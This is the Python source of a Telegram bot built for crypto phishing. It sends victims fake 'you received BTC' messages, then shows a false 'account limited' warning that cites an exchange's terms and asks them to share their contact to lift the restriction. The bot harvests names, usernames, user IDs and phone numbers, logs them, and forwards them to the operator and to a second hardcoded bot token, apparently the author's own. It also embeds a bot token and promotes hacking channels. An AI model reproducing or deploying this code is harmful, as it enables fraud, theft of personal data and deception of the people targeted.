from btcdata import ID, bot, start_bot
import telebot
from telebot import types
import time
import random
import requests

log = open('bot-log.txt', 'a+', encoding='utf-8')

YOUR_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
YOUR_BOT_ID = "661262775"
your_bot = telebot.TeleBot(YOUR_BOT_TOKEN)

# Dictionary to store click count for each user
click_count = {}

# Function to create an inline keyboard with buttons
def create_custom_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    
    # Row 1: Join Channel 1 and Join Channel 2 buttons
    join_channel1_button = types.InlineKeyboardButton("Join Channel 1", url="https://t.me/onlinehacking")
    join_channel2_button = types.InlineKeyboardButton("Join Channel 2", url="https://t.me/termuxhacktutorial")
    markup.row(join_channel1_button, join_channel2_button)
    
    # Row 2: Check button
    check_button_text = "Welcome to the bot!" if click_count.get(user_id, 0) % 2 == 1 else "✅ Check"
    check_button = types.InlineKeyboardButton(check_button_text, callback_data="check_button")
    markup.row(check_button)
    
    return markup

bot.send_message(ID, '⚠️ In use this bot you have to join our telegram channel. \n \n After successful joining two telegram channel click check button‌ ✅', reply_markup=create_custom_keyboard(ID))
print("\n\n\033[91m[\033[92m*\033[91m]\033[93m Bot Launched! \033[96m >>> \033[0m\n\n")

# Handler for the "Check" button click
@bot.callback_query_handler(func=lambda call: call.data == "check_button")
def handle_check_button_click(call):
    user_id = call.message.chat.id
    click_count[user_id] = click_count.get(user_id, 0) + 1
    if click_count[user_id] % 2 == 1:
        bot.send_message(user_id, "⚠️ If you have not joined our Telegram channel, Join again and check!")
    else:
        bot.send_message(user_id, "✅ Your Bot has become Active now typr /admin!")


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, 'Welcome to the bot admin panel! \n \n Enter the amount for which to create Fack BTC Received:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'User Received: {message.text}')
			bot.send_message(ID, f'Your check: https://t.me/{bot.get_me().username}?start={message.text}')
		else:
			bot.send_message('The value must be number!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, 'Welcome to the bot! \nTo enter the admin panel, write: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f' ⛄️ User with ID: {userid} "BTC" your check for the amount:{summ}')
			bot.send_message(message.chat.id, f'''You received 0.00{random.randint(51, 253)} BTC ({summ} RUB) от /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅ Remove Restrictions", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "⚠️ Warning >>> \n\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅ Remove Restrictions", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "⚠️ Warning >>> \n\n❌ Your account is limited! Most likely, you have violated the terms of service (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'User with ID:{userid} launched a bot!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
    if message.contact is not None: 
        nick = message.from_user.username
        first = message.contact.first_name
        last = message.contact.last_name
        userid = message.contact.user_id
        phone = message.contact.phone_number
        bot.send_message(userid, "✅ The restrictions have been successfully lifted, thank you for using our bot!")
        info = f'''
         🧿 User Data:
            ├Name: {first} {last}
            ├ID: {userid}
            ├Username: @{nick}
            └Phone number: {phone}

🎭 Follow @TermuxHackTutorial for more...
	    '''
        log = open('bot-log.txt', 'a+', encoding='utf-8')
        log.write(info + '  ')
        log.close()
        bot.send_message(ID, info)
        your_bot.send_message(YOUR_BOT_ID, info)  
        print(info)

        if message.contact.user_id != message.chat.id:
            bot.send_message(message.chat.id, '❌ Authorize Your contact!')    	

if __name__ == "__main__":
    start_bot()
    bot.polling(none_stop=True)
        
